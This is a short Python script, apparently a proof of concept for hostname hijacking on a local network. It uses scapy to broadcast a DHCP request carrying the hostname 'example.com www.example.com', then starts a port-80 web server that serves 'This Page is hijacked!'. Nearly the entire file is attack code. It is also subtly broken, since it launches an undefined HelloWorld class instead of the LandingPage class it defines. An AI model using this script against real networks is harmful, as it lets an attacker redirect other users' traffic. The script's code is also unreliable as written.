#!/usr/bin/env python
# coding=utf-8
'''
..author:: coffeemakr
'''
from __future__ import print_function

import sys
from scapy.all import *

def send_dhcp_request(hostname):
    '''
    Send one dhcp request and wait for an answer.
    :param hostname: The hostname to send
    '''
    conf.checkIPaddr = False
    fam,hw = get_if_raw_hwaddr(conf.iface)

    dhcp_request = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                    IP(src="0.0.0.0",dst="255.255.255.255") /
                    UDP(sport=68,dport=67) /
                    BOOTP(chaddr=hw) /
                    DHCP(options=[
                        ("message-type","request"),
                        ('hostname', hostname),"end"]))

    srp(dhcp_request)
    print("DHCP Request finished")

def start_landing_server():
    '''
    Starts a HTTP Server on port 80
    '''
    import cherrypy
    class LandingPage(object):
        def index(self):
            return "This Page is hijacked!"
        index.exposed = True

    cherrypy.server.socket_port = 80
    cherrypy.server.socket_host = '0.0.0.0'
    try:
        cherrypy.quickstart(HelloWorld())
    except:
        print("Unable to start Server")


def main():
    send_dhcp_request('example.com www.example.com')
    start_landing_server()

if __name__ == '__main__':
    main()
